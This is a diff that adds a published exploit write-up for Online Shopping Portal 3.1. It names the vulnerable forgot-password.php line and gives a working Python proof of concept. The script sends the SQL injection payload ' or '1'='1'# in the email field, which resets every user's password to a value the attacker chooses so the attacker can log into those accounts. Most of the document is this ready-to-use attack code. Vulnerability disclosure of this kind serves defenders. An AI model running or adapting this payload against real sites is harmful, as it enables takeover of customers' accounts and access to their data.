@@ -1,0 +1,54 @@
+# Exploit Title: Online Shopping Portal 3.1 - 'email' SQL Injection 
+# Date: 2020-07-06
+# Exploit Author: gh1mau
+# Team Members: Capt'N,muzzo,chaos689 | https://h0fclanmalaysia.wordpress.com/
+# Vendor Homepage: https://phpgurukul.com/shopping-portal-free-download/
+# Software Link: https://phpgurukul.com/?smd_process_download=1&download_id=7393
+# Version: V3.1
+# Tested on: PHP 5.6.18, Apache/2.4.18 (Win32), Ver 14.14 Distrib 5.7.11, for Win32 (AMD64)
+
+Info:
+-----
+[+] Attacker can change all user's password from the forgot-password.php page and login to their account.
+
+Vulnerable File:
+---------------- 
+/forgot-password.php
+
+Vulnerable Code:
+-----------------
+line 8: $email=$_POST['email'];
+
+Vulnerable Issue:
+-----------------
+$email=$_POST['email']; has no sanitization
+
+
+
+POC:
+----
+
+import requests
+
+url = "http://localhost:80/shopping/forgot-password.php"
+
+password = "gh1mau"
+payload = "email=saya%40saya.com' or '1'='1'#&contact=1234&password=" + password + "&confirmpassword=" + password + "&change="
+headers = {
+    "Origin": "http://localhost", 
+    "Cookie": "PHPSESSID=pq2dc9oja60slrifcfjuq7vhf0", 
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0", 
+    "Connection": "close", 
+    "Referer": "http://localhost/shopping/forgot-password.php", 
+    "Host": "localhost", 
+    "Accept-Encoding": "gzip, deflate", 
+    "Upgrade-Insecure-Requests": "1", 
+    "Accept-Language": "en-US,en;q=0.5", 
+    "Content-Length": "96", 
+    "Content-Type": "application/x-www-form-urlencoded"
+}
+
+response = requests.request("POST", url, data=payload, headers=headers)
+
+print("[+] Try login with password : " + password)
